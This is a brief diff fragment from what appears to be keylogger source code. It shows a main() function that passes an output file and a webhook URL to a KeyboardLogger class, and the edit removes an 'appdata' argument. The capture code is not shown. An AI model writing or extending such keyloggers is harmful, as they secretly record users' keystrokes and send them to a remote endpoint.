@@ -162,5 +162,5 @@ class KeyboardLogger:
 def main(filexd, urlxd):
     output_file = filexd
     webhook_url = urlxd
-    logger = KeyboardLogger(output_file, webhook_url, "appdata")
+    logger = KeyboardLogger(output_file, webhook_url)
     logger.start_logging()
